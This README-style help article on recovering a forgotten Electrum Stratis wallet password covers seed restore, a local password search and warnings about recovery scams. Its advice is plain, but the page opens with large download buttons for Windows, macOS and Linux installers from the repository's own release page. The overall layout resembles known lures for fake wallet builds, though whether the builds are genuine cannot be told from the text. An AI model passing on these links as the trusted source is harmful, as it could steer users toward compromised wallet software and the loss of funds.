![Electrum-Stratis](assets/banner-article.png)

# Electrum Stratis password recovery: what is possible and what is not

<p align="center">There is no reset, and no service</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

There is no password reset in Electrum Stratis, because there is no account to reset. A forgotten password is solved one of two ways: restore the wallet from its seed into a fresh wallet file, or test candidate passwords locally against the wallet file you still hold. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain and is actively maintained.

## You'll see this if

<div align="center">

| What you see | What it usually means | Where the answer is |
|---|---|---|
| "Incorrect password" when unlocking | Typo, wrong keyboard layout, or a passphrase typed differently at creation | Retry with layout checked; then step 3 |
| You still have a `.dat` file but never wrote the password down | The password protects the file, and only the file | Step 3 |
| A fresh install asks you to set a password for a wallet you did not create | The create flow was opened instead of the recover flow | Step 2 |
| An old screenshot shows the balance but the wallet will not open | The key material is in the seed or the file, not on screen | Step 2 or 3 |
| A website or a direct message offers to "restore" the wallet | Recovery offers are a known scam pattern | The scams article below |

</div>

The single most useful thing to establish first is which of the three backup models you actually hold: a seed, a wallet file with a password, or nothing. Electrum Stratis names that model before it asks for anything, so the next step is never a guess.

## Why it happens

The password decrypts a local file; it does not unlock an account on a server. Electrum Stratis stores the wallet as ciphertext next to a small verifier, so the verifier can confirm that a candidate password is correct and can do nothing else - it cannot reveal, shorten or reverse the password. No server holds a copy, which is why no reset link, security question or support override can exist.

That design is the point of a self-custody wallet - nobody else can open the file, including the people who wrote the software ([Electrum Stratis security and keys](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)). It also means the usual habits from web accounts - reset by email, reset by phone, "forgot password" links - have no counterpart here. A forgotten password is a key problem, and key problems are solved with keys.

Updating is not a recovery method, and it is not sold as one: the maintained build, with its current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), does not promise to open a file, it gives you the restore flow described below.

## Fix

1. **Identify the backup model.** Open the wallet. If it offers both Create and Recover as equal choices on first launch, you are in the right flow. If you are being asked to choose a password for a new wallet, back out and choose Recover instead. The wallet's backup-model detector names seed, file plus password, raw key or unknown before it requests anything.
2. **If you have the seed, restore from it.** Choose Recover, select the legacy seed restore, and enter the seed into the wallet window itself. The wallet previews the addresses it derives before you commit, so you can confirm the funds are the ones you expect. The restore writes a fresh wallet file and the old password is discarded - a restored wallet sets its own new password and never needs the forgotten one.
3. **If you have only the file, search candidate passwords locally.** Electrum Stratis runs an offline search over a list of candidates against the wallet file. It reports the odds honestly and stops when it can no longer succeed, rather than running forever. Success depends entirely on the real password being among the candidates you supply - a variation you actually used, in the layout and capitalisation you actually typed.
4. **If you have neither the seed nor the file, stop and read this before spending money.** No seed, no wallet file and no device means there is nothing on disk or on the chain to decrypt. Nothing restores that wallet, and any service claiming otherwise is selling you a search you can run yourself for free.

Never type a seed, a private key or a password into a website, a chat, a support form or a browser extension. The only place a seed belongs is the wallet's own restore window on your own machine.

## If that did not work

A failed password search is not a bug and not a support issue; it means the correct password was not in the candidate set. Before concluding that, confirm three things: that you are opening the right file (a second `.dat` from an older install is common), that the keyboard layout matches the one used when the wallet was created, and that the wallet is the legacy Stratis build rather than a different Electrum-derived wallet that cannot read this file.

If the search path has been exhausted, the only remaining route is the seed. A wallet with no seed and no readable file cannot be recovered by anyone, and the honest answer is to say so rather than to keep trying. Keep the file anyway: a file that cannot be opened today is still the only object that could be opened if a password surfaces later. If the file opens but the balance then looks wrong, that is a separate problem covered in [an Electrum Stratis balance that is missing](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md).

Recovery offers that arrive by direct message, by comment, or through a "recovery app" should be treated as hostile. They follow a script: a small upfront fee, then a request for the file or the seed, then nothing. The scams article covers the variants in detail.

## Prevention

- Write the seed on paper at creation and store it where you would store a passport, not in a photo, a note app or an email draft.
- Test the restore once, with a small amount, before the wallet holds anything that matters. A backup you have never restored is a hope, not a backup.
- Keep a copy of the wallet file separate from the machine, and record which password belongs to which file.
- Encrypt the machine and the backup location; a wallet file plus a weak password is a short search for anyone who takes the disk.
- Prefer a long passphrase you can retype over a short password you cannot.

## FAQ

### Can I find my old password?

Not by looking it up anywhere - there is no record of it, on your machine or on a server. You can confirm a guess against the wallet file, and the wallet's offline search can test a list of candidates, but a password that is not in the list cannot be derived from the file.

### Is there an Electrum Stratis recovery app?

No. Electrum Stratis is a desktop wallet, and recovery is a flow inside it, not a separate app. Apps, browser pages and "recovery services" that promise to unlock a wallet are the most common impersonation pattern around self-custody wallets, and none of them can do anything the wallet cannot do locally.

### Does the password search always succeed?

No, and it is important to know that before starting. The search tests candidates; it does not break encryption. If the password was long, random and never written down, the realistic outcome is that the search reports it cannot succeed - and that report is more useful than a false hope.

### Can support reset my password?

No. There is no account, no email and no phone number attached to the wallet, so there is nothing for support to reset. Documentation explains the flows; it cannot decrypt a file. Anyone who claims otherwise is not support.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [What a "recovery app" actually does](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md)
- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
